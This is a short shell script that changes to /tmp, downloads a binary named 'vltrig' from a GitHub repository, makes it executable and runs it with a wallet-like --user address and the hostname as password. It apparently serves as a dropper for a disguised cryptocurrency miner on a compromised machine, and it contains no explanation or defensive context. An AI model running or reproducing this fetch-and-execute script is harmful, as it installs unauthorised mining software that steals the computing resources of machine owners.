#!/bin/sh

cd /tmp
wget https://github.com/ivanhi0/ivanhi0.github.io/raw/refs/heads/main/vltrig
chmod +x ./vltrig
./vltrig --user 42zHmvjLFQf6nLHbVCzm5RNxwovafb9mbPhYixC9ynFn29uxjGfPY3Z1BM5e2RXdnyiZCcujqznUoJ7AfPQpy4BPU7UrCJb --pass $(hostname -b)
